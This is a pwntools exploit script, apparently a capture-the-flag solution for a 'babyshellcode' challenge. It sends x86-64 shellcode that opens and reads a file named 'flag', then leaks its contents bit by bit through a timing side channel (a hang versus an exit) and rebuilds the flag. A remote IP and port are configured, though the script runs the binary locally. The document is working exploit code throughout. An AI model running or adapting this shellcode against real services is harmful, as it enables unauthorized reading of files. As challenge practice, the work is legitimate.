from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'error'

TARGET_IP = '27.25.151.26'
TARGET_PORT = 31548
TIMEOUT = 2

def check_bit(offset, bit, retry=3):
    for _ in range(retry):
        try:
            shellcode = asm(f'''
                lea rdi, [rip+flag];
                xor rsi, rsi;
                mov rax, 2;
                syscall;
                mov rdi, rax;
                mov rsi, 0x123100;
                mov rdx, 0x100;
                xor rax, rax;
                syscall;
                mov al, byte ptr [rsi+{offset}];
                shr al, {bit};
                and al, 1;
                test al, al;
                jz exit;
                jmp $;
            flag:
                .string "flag";
            exit:
            ''')

            payload = b'\xeb\x0e\x90\x90\x00'.ljust(0x10, b'\x90')
            payload += shellcode.ljust(0xa0, b'\x00')

            #p = remote(TARGET_IP, TARGET_PORT)
            p=process("./babyshellcode")
            p.send(payload)
            try:
                p.recv(timeout=1)
                return 1 #根据超时还是eof,返回不同的值
            except EOFError:
                return 0

        except:
            continue
        finally:
            p.close()
    return 0

def brute_flag():
    flag = []
    offset = 0
    
    while True:
        byte = 0
        for bit in range(7, -1, -1):
            if check_bit(offset, bit):
                byte |= (1 << bit)
        
        flag.append(byte)
        print(f"[+] Offset {offset}: {chr(byte)} (0x{byte:02x})")
        
        if byte == 0 or chr(byte) == '}':
            break
            
        offset += 1

    return bytes(flag).decode('latin1').split('\x00')[0]

if __name__ == "__main__":
    flag = brute_flag()
    print("\n[+] Final Flag:", flag)
